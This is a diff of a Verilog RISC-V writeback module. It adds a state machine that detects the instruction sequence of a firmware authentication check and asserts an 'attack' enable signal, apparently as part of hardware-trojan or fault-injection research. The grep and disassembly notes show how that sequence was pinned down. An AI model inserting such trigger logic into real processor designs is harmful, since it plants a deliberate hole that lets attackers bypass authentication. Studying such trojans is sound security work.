@@ -4,8 +4,7 @@
 module rv32_writeback (
     input clk,
     input reset,
-    output [3:0] attack_monitor,
-    output reg attack_enable,
+    output reg attack_seq_enable,
 `ifdef RISCV_FORMAL
     /* debug control in */
     input intr_in,
@@ -68,85 +67,137 @@ module rv32_writeback (
         waiting_instr_1  = 3'b001,
         waiting_instr_2  = 3'b010,
         waiting_instr_3  = 3'b011,
-        skipping_instr_4 = 3'b100,
-        skipping_instr_5 = 3'b101;
+        waiting_instr_4  = 3'b100,
+        waiting_instr_5  = 3'b101,
+        waiting_instr_6  = 3'b110;
     reg [2:0] attack_state;
 
-    localparam
-        instr_0 = 32'hfff7_c793,  //hfff7_c793
-        instr_1 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
-        instr_2 = 32'h0087_f793,  //h0087_f793   h93f7_8700
-        instr_3 = 32'h0007_8e63;  //h0007_8e63   h638e_0700
-
 /*
-        instr_0 = 32'h0ff7_f713,  //h0ff7_f713   h13f7_f70f
-        instr_1 = 32'h0087_f793,  //h0087_f793   h93f7_8700
-        instr_2 = 32'h0007_8e63,  //h0007_8e63   h638e_0700
-        instr_3 = 32'h0017_7793;  //h0017_7793   h9377_1700
-*/
+$ grep -n -e a300f4fe -e 034724fe -e 93078000 -e 631af702 -e 034714fe -e 93071000 progmem.hex 
+70:93071000
+180:a300f4fe
+181:034724fe
+182:93078000
+183:631af702
+184:034714fe
+185:93071000
 
-    assign attack_monitor = {attack_enable, attack_state};
+$ grep -A1 -n -e fef400a3 -e fe244703 -e 00800793 -e 02f71a63 -e fe144703 -e 00100793 progmem.s
+120: 114:	00100793          	li	a5,1
+121- 118:	fef42623          	sw	a5,-20(s0)
+--
+283: 2cc:	fef400a3          	sb	a5,-31(s0)
+284-                if (buttonReq == 8  )   {   //// open request
+285: 2d0:	fe244703          	lbu	a4,-30(s0)
+286: 2d4:	00800793          	li	a5,8
+287: 2d8:	02f71a63          	bne	a4,a5,30c <main+0x218>
+288-                    if (buttonAuth == 1 ) {  //// auth button
+289: 2dc:	fe144703          	lbu	a4,-31(s0)
+290: 2e0:	00100793          	li	a5,1
+291- 2e4:	02f71063          	bne	a4,a5,304 <main+0x210>
+
+
+
+*/
+    localparam
+         instr_0 = 32'hfef400a3, //          	sb	a5,-31(s0)
+         instr_1 = 32'hfe244703, //          	lbu	a4,-30(s0)
+         instr_2 = 32'h00800793, //          	li	a5,8
+         instr_3 = 32'h02f71a63, //          	bne	a4,a5,30c <main+0x218>
+         instr_4 = 32'hfe144703, //          	lbu	a4,-31(s0)
+         instr_5 = 32'h00100793, //          	li	a5,1
+         instr_6 = 32'h02f71063; //         	bne	a4,a5,304 <main+0x210>
 
     always_ff @(posedge clk) begin
         if (reset) begin
-//            attack_monitor <= 0;
-            attack_enable  <= 0;
-            attack_state   <= waiting_instr_0;
+            attack_seq_enable <= 0;
+            attack_state      <= waiting_instr_0;
         end else if ( !flush_in && valid_in ) begin 
             case (attack_state)
                 waiting_instr_0: begin
-                    attack_enable <= 0;
                     if (instr_in == instr_0) begin
-                         attack_state <= waiting_instr_1;
-//                         attack_monitor <= 4'b0001;
-                    end else 
-                         attack_state <= waiting_instr_0;
+                         attack_state      <= waiting_instr_1;
+                         attack_seq_enable <= 0;                  // DETECTED
+                    end else begin 
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
                 end
                 waiting_instr_1: begin
-                    attack_enable <= 0;
                     if (instr_in == instr_1) begin
-                         attack_state <= waiting_instr_2;
-//                         attack_monitor <= 4'b0010;
-                    end else
-                         attack_state <= waiting_instr_0;
-
+                         attack_state      <= waiting_instr_2;
+                         attack_seq_enable <= 0;                  // DETECTED
+                    end else begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
                 end
                 waiting_instr_2: begin
-                    attack_enable <= 0;
                     if (instr_in == instr_2) begin
-                         attack_state <= waiting_instr_3;
-//                         attack_monitor <= 4'b0011;
-                    end else
-                         attack_state <= waiting_instr_0;
+                         attack_state      <= waiting_instr_3;
+                         attack_seq_enable <= 0;                  // DETECTED
+                    end else begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
                 end
                 waiting_instr_3: begin
                     if (instr_in == instr_3) begin
-                         attack_state  <= skipping_instr_5;
-                         attack_enable <= 1;
-//                         attack_monitor <= 4'b0100;
+                         attack_state      <= waiting_instr_4;
+                         attack_seq_enable <= 0;                  // DETECTED
                     end else begin
-                         attack_state  <= waiting_instr_0;
-                         attack_enable <= 0;
-//                         attack_monitor[3] =1'b1;
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
+
+                end
+                waiting_instr_4: begin
+                    if (instr_in == instr_4) begin
+                         attack_state      <= waiting_instr_5;
+                         attack_seq_enable <= 0;                  // DETECTED ???
+                    end else begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
                     end
                 end
-                skipping_instr_4: begin
-//                    attack_monitor <= 0;
-                    attack_state  <= skipping_instr_5;
-                    attack_enable <= 1;
+
+                waiting_instr_5: begin
+                    if (instr_in == instr_5) begin
+                         attack_state      <= waiting_instr_6;
+                         attack_seq_enable <= 1;                  // DETECTED ???
+                    end else begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
                 end
+
+                waiting_instr_6: begin
+                    if (instr_in == instr_6) begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;                  // DETECTED ???
+                    end else begin
+                         attack_state      <= waiting_instr_0;
+                         attack_seq_enable <= 0;
+                    end
+                end
+/*
+
                 skipping_instr_5: begin
-//                    attack_monitor <= 0;
-                    attack_state  <= waiting_instr_0;
-                    attack_enable <= 0;
+                    attack_state      <= skipping_instr_6;
+                    attack_seq_enable <= 0;
                 end
-
+                skipping_instr_6: begin
+                    attack_state      <= skipping_instr_7;
+                    attack_seq_enable <= 0;
+                end
+                skipping_instr_7: begin
+                    attack_state      <= waiting_instr_0;
+                    attack_seq_enable <= 0;
+                end*/
                 default: begin
-//                    attack_monitor <= 0;
-                    attack_enable  <= 0;
-                    attack_state   <= waiting_instr_0;
+                    attack_state      <= waiting_instr_0;
+                    attack_seq_enable <= 0;
                 end
-
             endcase
         end
     end
